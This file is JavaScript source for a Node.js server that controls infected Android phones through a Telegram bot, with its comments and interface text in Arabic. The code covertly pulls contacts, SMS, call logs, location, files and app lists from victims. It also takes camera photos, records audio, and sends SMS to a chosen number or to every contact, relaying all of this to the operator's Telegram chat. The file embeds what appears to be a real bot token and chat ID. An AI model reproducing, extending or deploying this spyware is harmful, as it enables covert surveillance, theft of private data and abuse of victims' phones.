hereconst express = require('express');
const WebSocket = require('ws'); 
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

const token = '8323283006:AAES3GC8Y2vA5NsPYSb8p2nKoHAjZ0n1ZeM';
const id = '7604667042';

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const bot = new TelegramBot(token, {
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

const clients = new Map();
const upload = multer();

app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// Routes الأساسية
app.get('/', (req, res) => {
    res.send('<h1 align="center">✅ الخادم يعمل بنجاح</h1>');
});

// استقبال الملفات من الأجهزة
app.post('/uploadFile', upload.single('file'), (req, res) => {
    const filename = req.file.originalname;
    const model = req.headers.model || 'Unknown';
    
    bot.sendDocument(id, req.file.buffer, {
        caption: `📁 ملف من جهاز: <b>${model}</b>\n📄 اسم الملف: ${filename}`,
        parse_mode: 'HTML'
    }, { filename: filename, contentType: 'application/octet-stream' });
    
    res.send('');
});

// استقبال النصوص
app.post('/uploadText', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendMessage(id, `📝 رسالة من جهاز: <b>${model}</b>\n\n${req.body.text}`, { parse_mode: 'HTML' });
    res.send('');
});

// استقبال الموقع
app.post('/uploadLocation', (req, res) => {
    const model = req.headers.model || 'Unknown';
    bot.sendLocation(id, req.body.lat, req.body.lon);
    bot.sendMessage(id, `📍 موقع من جهاز: <b>${model}</b>`, { parse_mode: 'HTML' });
    res.send('');
});

// استقبال الصور من الكاميرا
app.post('/uploadImage', upload.single('image'), (req, res) => {
    const model = req.headers.model || 'Unknown';
    const cameraType = req.headers.camera_type || 'Unknown';
    
    bot.sendPhoto(id, req.file.buffer, {
        caption: `📸 صورة من جهاز: <b>${model}</b>\n🎯 الكاميرا: ${cameraType}`,
        parse_mode: 'HTML'
    });
    
    res.send('');
});

// استقبال التسجيلات الصوتية
app.post('/uploadAudio', upload.single('audio'), (req, res) => {
    const model = req.headers.model || 'Unknown';
    const duration = req.headers.duration || 'Unknown';
    
    bot.sendAudio(id, req.file.buffer, {
        caption: `🎤 تسجيل صوتي من جهاز: <b>${model}</b>\n⏱️ المدة: ${duration} ثانية`,
        parse_mode: 'HTML'
    });
    
    res.send('');
});

// اتصال WebSocket
wss.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'Unknown';
    const version = req.headers.version || 'Unknown';
    const brightness = req.headers.brightness || 'Unknown';
    const provider = req.headers.provider || 'Unknown';
    
    ws.uuid = uuid;
    clients.set(uuid, { 
        model, 
        battery, 
        version, 
        brightness, 
        provider,
        connection: ws
    });
    
    console.log(`✅ جهاز متصل: ${model} (${uuid})`);
    
    // إرسال رسالة ترحيب بالمطور
    bot.sendMessage(id, 
        `🆕 جهاز جديد متصل ✅\n\n` +
        `📱 الطراز: <b>${model}</b>\n` +
        `🔋 البطارية: <b>${battery}%</b>\n` +
        `🤖 الأندرويد: <b>${version}</b>\n` +
        `💡 السطوع: <b>${brightness}</b>\n` +
        `📶 الشركة: <b>${provider}</b>\n` +
        `🆔 الرمز: <code>${uuid}</code>`, 
        { parse_mode: 'HTML' }
    );
    
    ws.on('close', () => {
        console.log(`❌ جهاز انقطع: ${model}`);
        bot.sendMessage(id, 
            `❌ الجهاز انقطع\n\n` +
            `📱 الطراز: <b>${model}</b>\n` +
            `🔋 البطارية: <b>${battery}%</b>`,
            { parse_mode: 'HTML' }
        );
        clients.delete(uuid);
    });
    
    ws.on('error', (error) => {
        console.error(`❌ خطأ في الاتصال: ${error}`);
    });
});

// معالجة رسائل البوت
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    // التحقق من هوية المستخدم
    if (chatId.toString() !== id) {
        bot.sendMessage(chatId, '❌ غير مصرح لك باستخدام هذا البوت');
        return;
    }
    
    console.log(`📩 رسالة مستخدم: ${text}`);
    
    // معالجة الردود
    if (msg.reply_to_message) {
        handleReplyMessage(msg);
        return;
    }
    
    // معالجة الأوامر الرئيسية
    handleMainCommand(msg);
});

function handleReplyMessage(msg) {
    const replyText = msg.reply_to_message.text;
    const userText = msg.text;
    
    if (!currentUuid) {
        bot.sendMessage(id, '❌ لم يتم تحديد جهاز. استخدم قائمة الأوامر أولاً');
        return;
    }
    
    if (replyText.includes('أدخل الرقم المستهدف')) {
        currentNumber = userText;
        bot.sendMessage(id, '📝 الآن أدخل نص الرسالة:', { 
            reply_markup: { force_reply: true } 
        });
        return;
    }
    
    if (replyText.includes('الآن أدخل نص الرسالة')) {
        sendToDevice(currentUuid, `sms:${currentNumber}:${userText}`);
        showMainMenu('✅ تم إرسال الرسالة النصية');
        return;
    }
    
    if (replyText.includes('أدخل الرسالة للجميع')) {
        sendToDevice(currentUuid, `sms_all:${userText}`);
        showMainMenu('✅ تم إرسال الرسالة للجميع');
        return;
    }
    
    if (replyText.includes('أدخل مسار الملف')) {
        sendToDevice(currentUuid, `get_file:${userText}`);
        showMainMenu('✅ جاري جلب الملف...');
        return;
    }
    
    if (replyText.includes('أدخل مدة التسجيل الصوتي')) {
        const duration = parseInt(userText) || 10;
        sendToDevice(currentUuid, `record_audio:${duration}`);
        showMainMenu(`🎤 جاري التسجيل لمدة ${duration} ثانية...`);
        return;
    }
    
    if (replyText.includes('أدخل نص الإشعار')) {
        sendToDevice(currentUuid, `show_toast:${userText}`);
        showMainMenu('✅ تم عرض الإشعار');
        return;
    }
    
    if (replyText.includes('أدخل رابط الصوت')) {
        sendToDevice(currentUuid, `play_audio:${userText}`);
        showMainMenu('🔊 جاري تشغيل الصوت...');
        return;
    }
}

function handleMainCommand(msg) {
    const text = msg.text;
    
    switch(text) {
        case '/start':
            showStartMenu();
            break;
            
        case '📱 الأجهزة المتصلة':
            showConnectedDevices();
            break;
            
        case '⚙️ قائمة الأوامر':
            showCommandsList();
            break;
            
        case '🔄 تحديث القائمة':
            showConnectedDevices();
            break;
            
        default:
            bot.sendMessage(id, '❌ أمر غير معروف. استخدم /start للبدء');
    }
}

// معالجة Callback Queries - جميع الأوامر المؤكدة
bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    
    console.log(`🔘 callback: ${data}`);
    
    try {
        const [action, uuid] = data.split(':');
        const device = clients.get(uuid);
        
        if (!device) {
            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ الجهاز غير متصل' });
            return;
        }
        
        // الرد الفوري على Callback
        bot.answerCallbackQuery(callbackQuery.id);
        
        switch(action) {
            case 'device':
                showDeviceCommands(message, uuid, device);
                break;
                
            case 'info':
                sendToDevice(uuid, 'get_info');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📊 جاري جمع المعلومات...');
                break;
                
            case 'sms':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '📱 أدخل الرقم المستهدف:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
                
            case 'sms_all':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '📨 أدخل الرسالة لإرسالها للجميع:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
                
            case 'calls':
                sendToDevice(uuid, 'get_calls');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📞 جاري جلب سجل المكالمات...');
                break;
                
            case 'contacts':
                sendToDevice(uuid, 'get_contacts');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('👥 جاري جلب جهات الاتصال...');
                break;
                
            case 'messages':
                sendToDevice(uuid, 'get_messages');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('💬 جاري جلب الرسائل...');
                break;
                
            case 'location':
                sendToDevice(uuid, 'get_location');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📍 جاري الحصول على الموقع...');
                break;
                
            case 'record_audio':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '🎤 أدخل مدة التسجيل بالثواني:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
                
            case 'camera_front':
                sendToDevice(uuid, 'take_photo:front');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📸 جاري التقاط صورة أمامية...');
                break;
                
            case 'camera_back':
                sendToDevice(uuid, 'take_photo:back');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📷 جاري التقاط صورة خلفية...');
                break;
                
            case 'files':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '📁 أدخل مسار الملف (مثل /sdcard/Download):', { 
                    reply_markup: { force_reply: true } 
                });
                break;
                
            case 'toast':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '🔔 أدخل نص الإشعار:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
                
            case 'vibrate':
                sendToDevice(uuid, 'vibrate');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📳 جاري جعل الجهاز يهتز...');
                break;
                
            case 'play_sound':
                currentUuid = uuid;
                bot.deleteMessage(id, message.message_id);
                bot.sendMessage(id, '🔊 أدخل رابط الصوت:', { 
                    reply_markup: { force_reply: true } 
                });
                break;
                
            case 'apps':
                sendToDevice(uuid, 'get_apps');
                bot.deleteMessage(id, message.message_id);
                showMainMenu('📱 جاري جلب قائمة التطبيقات...');
                break;
                
            default:
                bot.answerCallbackQuery(callbackQuery.id, { text: '❌ أمر غير معروف' });
        }
        
    } catch (error) {
        console.error('❌ خطأ في معالجة callback:', error);
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ حدث خطأ' });
    }
});

// الدوال المساعدة
function sendToDevice(uuid, command) {
    const device = clients.get(uuid);
    if (device && device.connection.readyState === WebSocket.OPEN) {
        device.connection.send(command);
        console.log(`✅ أمر مرسل: ${command} → ${uuid}`);
        return true;
    }
    return false;
}

function showMainMenu(text = 'اختر من القائمة:') {
    bot.sendMessage(id, text, {
        reply_markup: {
            keyboard: [
                ['📱 الأجهزة المتصلة', '⚙️ قائمة الأوامر'],
                ['🔄 تحديث القائمة']
            ],
            resize_keyboard: true
        }
    });
}

function showStartMenu() {
    bot.sendMessage(id,
        `🤖 *مرحباً بك في البوت المتقدم* \n\n` +
        `✅ *الميزات المتوفرة:*\n` +
        `📱 إدارة الأجهزة المتصلة\n` +
        `📞 سجل المكالمات والرسائل\n` +
        `📷 الكاميرا الأمامية والخلفية\n` +
        `🎤 تسجيل صوتي\n` +
        `📍 تتبع الموقع\n` +
        `📁 إدارة الملفات\n` +
        `\n⚡ *اختر من القائمة:*`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                keyboard: [
                    ['📱 الأجهزة المتصلة', '⚙️ قائمة الأوامر']
                ],
                resize_keyboard: true
            }
        }
    );
}

function showConnectedDevices() {
    if (clients.size === 0) {
        bot.sendMessage(id, '❌ لا توجد أجهزة متصلة حالياً');
        return;
    }
    
    let devicesText = `📱 *الأجهزة المتصلة (${clients.size}):*\n\n`;
    
    clients.forEach((device, uuid) => {
        devicesText += 
            `📱 *${device.model}*\n` +
            `🔋 ${device.battery}% | 🤖 ${device.version}\n` +
            `📶 ${device.provider} | 💡 ${device.brightness}\n` +
            `🆔 \`${uuid}\`\n\n`;
    });
    
    bot.sendMessage(id, devicesText, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: '🔄 تحديث', callback_data: 'refresh' },
                { text: '⚙️ الأوامر', callback_data: 'show_commands' }
            ]]
        }
    });
}

function showCommandsList() {
    if (clients.size === 0) {
        bot.sendMessage(id, '❌ لا توجد أجهزة متصلة');
        return;
    }
    
    const deviceButtons = [];
    clients.forEach((device, uuid) => {
        deviceButtons.push([{
            text: `📱 ${device.model} (${device.battery}%)`,
            callback_data: `device:${uuid}`
        }]);
    });
    
    bot.sendMessage(id, '🔘 اختر الجهاز لتنفيذ الأوامر:', {
        reply_markup: { inline_keyboard: deviceButtons }
    });
}

function showDeviceCommands(message, uuid, device) {
    const keyboard = [
        [{ text: '📊 معلومات الجهاز', callback_data: `info:${uuid}` }, { text: '📞 سجل المكالمات', callback_data: `calls:${uuid}` }],
        [{ text: '👥 جهات الاتصال', callback_data: `contacts:${uuid}` }, { text: '💬 الرسائل', callback_data: `messages:${uuid}` }],
        [{ text: '📱 إرسال رسالة', callback_data: `sms:${uuid}` }, { text: '📨 رسالة للجميع', callback_data: `sms_all:${uuid}` }],
        [{ text: '📸 كاميرا أمامية', callback_data: `camera_front:${uuid}` }, { text: '📷 كاميرا خلفية', callback_data: `camera_back:${uuid}` }],
        [{ text: '🎤 تسجيل صوتي', callback_data: `record_audio:${uuid}` }, { text: '📁 استعراض ملفات', callback_data: `files:${uuid}` }],
        [{ text: '📍 الموقع', callback_data: `location:${uuid}` }, { text: '🔔 إشعار', callback_data: `toast:${uuid}` }],
        [{ text: '📳 اهتزاز', callback_data: `vibrate:${uuid}` }, { text: '🔊 تشغيل صوت', callback_data: `play_sound:${uuid}` }],
        [{ text: '📱 التطبيقات', callback_data: `apps:${uuid}` }]
    ];
    
    bot.editMessageText(
        `⚙️ *أوامر الجهاز:* 📱 ${device.model}\n🔋 ${device.battery}% | 🤖 ${device.version}`,
        {
            chat_id: message.chat.id,
            message_id: message.message_id,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: keyboard }
        }
    );
}

// معالجة الأخطاء
bot.on('error', (error) => {
    console.error('❌ خطأ في البوت:', error);
});

bot.on('polling_error', (error) => {
    console.error('❌ خطأ في الاتصال:', error);
});

// بدء الخادم
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => {
    console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
    console.log('🤖 البوت جاهز لاستقبال الأجهزة...');
});

// الحفاظ على الاتصال نشطاً
setInterval(() => {
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            client.ping();
        }
    });
}, 30000);
